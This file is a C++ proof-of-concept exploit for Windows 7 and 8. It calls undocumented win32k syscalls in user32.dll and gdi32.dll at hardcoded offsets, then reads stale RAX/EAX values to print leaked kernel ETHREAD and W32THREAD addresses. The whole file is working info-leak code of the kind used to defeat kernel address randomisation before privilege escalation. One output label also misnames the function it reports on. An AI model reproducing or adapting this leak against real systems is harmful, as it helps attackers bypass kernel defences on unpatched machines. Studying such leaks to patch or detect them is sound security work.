// Syscalls.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <Winddi.h>

#ifdef _WIN64
//win8, 64bit
#define NtUserModifyUserStartupInfoFlagsAddress 0x263F0
#define NtUserGetAsyncKeyStateAddress 0x3B30
#define NtGdiPATHOBJ_vEnumStartClipLinesAddress 0x67590

#else
//win7, 32bit
#define NtUserModifyUserStartupInfoFlagsAddress 0x64D4B
#define NtUserGetAsyncKeyStateAddress 0xA2F4
#define NtGdiFONTOBJ_vGetInfoAddress 0x47123
#define NtGdiPATHOBJ_vEnumStartClipLinesAddress 0x47263

#endif

typedef DWORD(NTAPI * lNtUserModifyUserStartupInfoFlags)(DWORD Set, DWORD Flags);
typedef DWORD(NTAPI *lNtUserGetAsyncKeyState)(DWORD key);
typedef VOID(NTAPI * lNtGdiFONTOBJ_vGetInfo)(FONTOBJ *pfo, ULONG cjSize, FONTINFO *pfi);
typedef VOID(NTAPI * lNtGdiPATHOBJ_vEnumStartClipLines)(PATHOBJ *ppo, CLIPOBJ *pco, SURFOBJ *pso, LINEATTRS *pla);

extern "C" unsigned long long get_rax();

int main()
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return 1;
	}

	lNtUserGetAsyncKeyState pNtUserGetAsyncKeyState = (lNtUserGetAsyncKeyState)((DWORD_PTR)hUser32 + NtUserGetAsyncKeyStateAddress);

	pNtUserGetAsyncKeyState(20);
#ifdef _WIN64
	unsigned long long ethread = get_rax();
	printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%llx\r\n", ethread);
#else
	unsigned int ethread = 0;

	__asm {
		mov ethread, eax;
	}
	printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%X\r\n", ethread);
#endif

	lNtUserModifyUserStartupInfoFlags pNtUserModifyUserStartupInfoFlags = (lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32 + NtUserModifyUserStartupInfoFlagsAddress);

	pNtUserModifyUserStartupInfoFlags(20, 12);
#ifdef _WIN64
	unsigned long long ethread_full = get_rax();
	printf("NtUserModifyUserStartupInfoFlags ETHREAD full disclosure: 0x%llx\r\n", ethread_full);
#else
	unsigned ethread_full = 0;
	__asm {
		mov ethread_full, eax;
	}
	printf("NtUserModifyUserStartupInfoFlags ETHREAD full disclosure: 0x%X\r\n", ethread_full);
#endif


	HMODULE hGDI32 = LoadLibraryA("gdi32.dll");
	if (hGDI32 == NULL) {
		printf("Failed to load gdi32");
		return 1;
	}
#ifndef _WIN64


	lNtGdiFONTOBJ_vGetInfo pNtGdiFONTOBJ_vGetInfo = (lNtGdiFONTOBJ_vGetInfo)((DWORD_PTR)hGDI32 + NtGdiFONTOBJ_vGetInfoAddress);
	FONTOBJ surf = { 0 };
	FONTINFO finfo = { 0 };
	pNtGdiFONTOBJ_vGetInfo(&surf, 123, &finfo);

	long int w32thread = 0;
	__asm {
		mov w32thread, eax;
	}


	printf("NtGdiEngUnLockSurface W32THREAD full disclosure: 0x%X\r\n", w32thread);
#endif


	lNtGdiPATHOBJ_vEnumStartClipLines pNtGdiPATHOBJ_vEnumStartClipLines = (lNtGdiPATHOBJ_vEnumStartClipLines)((DWORD_PTR)hGDI32 + NtGdiPATHOBJ_vEnumStartClipLinesAddress);
	PATHOBJ pathobj = { 0 };
	CLIPOBJ pco = { 0 };
	SURFOBJ pso = { 0 };
	LINEATTRS pla = { 0 };
	pNtGdiPATHOBJ_vEnumStartClipLines(&pathobj, &pco, &pso, &pla);
#ifdef _WIN64
	unsigned long long w32thread = get_rax();
	printf("NtGdiPATHOBJ_vEnumStartClipLines W32THREAD full disclosure: 0x%llx\r\n", w32thread);
#else
	w32thread = 0;
	__asm {
		mov w32thread, eax;
	}
	printf("NtGdiPATHOBJ_vEnumStartClipLines W32THREAD full disclosure: 0x%X\r\n", w32thread);
#endif

	return 0;
}

